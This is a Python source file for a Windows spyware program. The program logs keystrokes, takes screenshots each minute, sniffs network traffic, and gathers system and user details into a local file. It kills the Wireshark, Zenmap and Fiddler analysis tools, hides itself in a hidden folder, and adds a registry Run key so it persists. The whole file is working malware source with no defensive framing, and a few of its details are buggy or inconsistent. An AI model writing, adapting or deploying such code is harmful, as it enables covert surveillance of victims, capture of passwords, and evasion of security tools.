import socket
import pyscreenshot
import threading
import shutil
import win32net
import psutil
import winreg as reg
import platform
from pynput.keyboard import Listener, Key
from collections import Counter
from scapy3k.all import *
import ctypes
import os

ips = []
info = ""
packet_counts = Counter()


def get_keyboard(key):
    global info
    info += str(key)


def get_screenshots():
    a = time.time()
    im = pyscreenshot.grab()
    im.save('{0}.png'.format(a))


def custom_action(packet):
    if IP in packet:
        ips.append(packet[IP].src)


def user_name():
    name = socket.gethostname()
    return name


def get_version():
   return(platform.platform())


def get_pc_ip():
    s = socket.getaddrinfo('', '')[-1][-1][0]
    return("your ip is: \n", s)


def get_process():
    listOfProcessNames = list()
    for proc in psutil.process_iter():
        pInfoDict = proc.as_dict(attrs=['pid', 'name', 'cpu_percent'])
        listOfProcessNames.append(pInfoDict)
    return(listOfProcessNames)


def find_tools(process):
    for proc in process:
        if(proc["name"]  == 'Wireshark.exe'):
            p = psutil.Process(proc["pid"])
            p.terminate()

        if(proc["name"]  == 'zenmap.exe'):
            p = psutil.Process(proc["pid"])
            p.terminate()

        if(proc["name"]  == 'Fiddler.exe'):
            p = psutil.Process(proc["pid"])
            p.terminate()


def groups():
    group = win32net.NetUserGetLocalGroups(None, os.getlogin())
    return group


def move_dir():
    s_name = os.getcwd()
    path = s_name + "\\shh"
    os.mkdir(path=s_name + "\\shh")
    shutil.move(s_name + "\\rafael.py", path)
    ctypes.windll.kernel32.SetFileAttributesW(path, 2)


def add_to_startup():
    pth = os.path.dirname(os.path.realpath(__file__))
    s_name = "refael.py"
    address=os.path.join(pth,s_name)
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
    reg.CloseKey(open)


def thread_function():
    global info
    add_to_startup()
    move_dir()
    ver = get_version()
    name = user_name()
    pc_ip = get_pc_ip()
    user_groups = groups()
    state_data = "user name: {0}\n computer ip: {1}\n computer version: {2}\n user groups: {3}\n".format(name, pc_ip,ver, user_groups)
    while True:
        my_info = info
        info = ''
        process = get_process()
        get_screenshots()
        find_tools(process)
        data = ("---UPDATE---\n  talking ips: {0}\n processes: {1}\n".format(str(ips),process))
        f = open("info.txt", "a")
        print(f)
        f.write(data + "\n" + "key logger: {0}\n " + state_data.format(my_info))
        f.close()
        time.sleep(60)


def lis_thread():
        Listener(on_press=get_keyboard).start()


def main():

    t = threading.Thread(target=thread_function)
    t.start()

    l = threading.Thread(target=lis_thread())
    l.start()

    sniff(filter='ip', prn=custom_action)

if __name__ == '__main__':
    main()
